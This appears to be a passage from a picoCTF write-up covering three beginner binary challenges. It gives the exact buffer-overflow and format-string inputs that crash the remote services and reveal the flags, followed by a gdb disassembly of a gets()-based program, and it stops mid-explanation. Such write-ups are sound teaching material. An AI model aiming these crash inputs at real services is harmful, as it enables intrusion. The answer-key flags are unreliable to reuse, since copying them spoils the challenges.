# Challenge 1 : Buffer overflow 0
>Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:

## Solution :

So first when I tried to connect to the machine it asked me for an input so I just tried hello, which triggered it to exit as shown below : 
```shell
FudgeSupreme-picoctf@webshell:~$ nc saturn.picoctf.net 57507
Input: hello
The program will exit now
```
then i decided to look into the program, which told us that `sigsev_handler`, will print out the flag, but it only get's triggered when there is a segmentation fault, so that's exactly what we are gonna do, I see that `buf2` has a size limit of only 16 characters, so i basically just tried to overflow it, by doing the following : 
```shell
FudgeSupreme-picoctf@webshell:~$ nc saturn.picoctf.net 57507
Input: 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}

FudgeSupreme-picoctf@webshell:~$
```
Which just gave me the flag.

## Flag : 
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

# Challenge 2 : format string 0
>Can you use your knowledge of format strings to make the customers happy?
>Download the binary here.
>Download the source here.

## Solution :

This is a pretty easy exploitation if u don't just look at the code file and give up, I didn't do much in this except keep on trying different choices until 1 worked although I did understand a bit later why they worked, but yeah, so here is how u solve this one : 
```shell
FudgeSupreme-picoctf@webshell:~$ nc mimas.picoctf.net 54020
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
So the options : `Gr%114d_Cheese` and `Cla%sic_Che%s%steak` work and u get the flag.

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

# Challenge 3: clutter overflow
>Clutter, clutter everywhere and not a byte to use.

## Solution : 

first seeing the challenge i couldn't understand much what to do except spam junk for 256 times, to surpass the size limit and overflow which didn't work, so next I decided to use gdb to debug it, as shown below : 
```shell
FudgeSupreme-picoctf@webshell:~$ gdb -q chall
Reading symbols from chall...
(No debugging symbols found in chall)
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004006c7 <+0>:     push   %rbp
   0x00000000004006c8 <+1>:     mov    %rsp,%rbp
   0x00000000004006cb <+4>:     sub    $0x110,%rsp
   0x00000000004006d2 <+11>:    movq   $0x0,-0x8(%rbp)
   0x00000000004006da <+19>:    mov    0x20197f(%rip),%rax        # 0x602060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e1 <+26>:    mov    $0x0,%esi
   0x00000000004006e6 <+31>:    mov    %rax,%rdi
   0x00000000004006e9 <+34>:    call   0x4005a0 <setbuf@plt>
   0x00000000004006ee <+39>:    mov    0x20197b(%rip),%rax        # 0x602070 <stdin@@GLIBC_2.2.5>
   0x00000000004006f5 <+46>:    mov    $0x0,%esi
   0x00000000004006fa <+51>:    mov    %rax,%rdi
   0x00000000004006fd <+54>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400702 <+59>:    mov    0x201977(%rip),%rax        # 0x602080 <stderr@@GLIBC_2.2.5>
   0x0000000000400709 <+66>:    mov    $0x0,%esi
   0x000000000040070e <+71>:    mov    %rax,%rdi
   0x0000000000400711 <+74>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400716 <+79>:    mov    0x201933(%rip),%rax        # 0x602050 <HEADER>
   0x000000000040071d <+86>:    mov    %rax,%rdi
   0x0000000000400720 <+89>:    call   0x400590 <puts@plt>
   0x0000000000400725 <+94>:    lea    0x69d(%rip),%rdi        # 0x400dc9
   0x000000000040072c <+101>:   call   0x400590 <puts@plt>
   0x0000000000400731 <+106>:   lea    0x6ac(%rip),%rdi        # 0x400de4
   0x0000000000400738 <+113>:   call   0x400590 <puts@plt>
   0x000000000040073d <+118>:   lea    -0x110(%rbp),%rax
   0x0000000000400744 <+125>:   mov    %rax,%rdi
   0x0000000000400747 <+128>:   mov    $0x0,%eax
   0x000000000040074c <+133>:   call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:   mov    $0xdeadbeef,%eax
   0x0000000000400756 <+143>:   cmp    %rax,-0x8(%rbp)
   0x000000000040075a <+147>:   jne    0x40078c <main+197>
   0x000000000040075c <+149>:   mov    $0xdeadbeef,%esi
   0x0000000000400761 <+154>:   lea    0x690(%rip),%rdi        # 0x400df8
   0x0000000000400768 <+161>:   mov    $0x0,%eax
   0x000000000040076d <+166>:   call   0x4005c0 <printf@plt>
   0x0000000000400772 <+171>:   lea    0x6a6(%rip),%rdi        # 0x400e1f
   0x0000000000400779 <+178>:   call   0x400590 <puts@plt>
   0x000000000040077e <+183>:   lea    0x6b8(%rip),%rdi        # 0x400e3d
   0x0000000000400785 <+190>:   call   0x4005b0 <system@plt>
   0x000000000040078a <+195>:   jmp    0x4007ba <main+243>
   0x000000000040078c <+197>:   mov    -0x8(%rbp),%rax
   0x0000000000400790 <+201>:   mov    %rax,%rsi
   0x0000000000400793 <+204>:   lea    0x6b0(%rip),%rdi        # 0x400e4a
   0x000000000040079a <+211>:   mov    $0x0,%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x000000000040079f <+216>:   call   0x4005c0 <printf@plt>
   0x00000000004007a4 <+221>:   mov    $0xdeadbeef,%esi
   0x00000000004007a9 <+226>:   lea    0x6aa(%rip),%rdi        # 0x400e5a
   0x00000000004007b0 <+233>:   mov    $0x0,%eax
   0x00000000004007b5 <+238>:   call   0x4005c0 <printf@plt>
   0x00000000004007ba <+243>:   mov    $0x0,%eax
   0x00000000004007bf <+248>:   leave  
   0x00000000004007c0 <+249>:   ret    
End of assembler dump.
```
on using gdb we first disassemble the main function and then look for key things, such as it shows the size of r
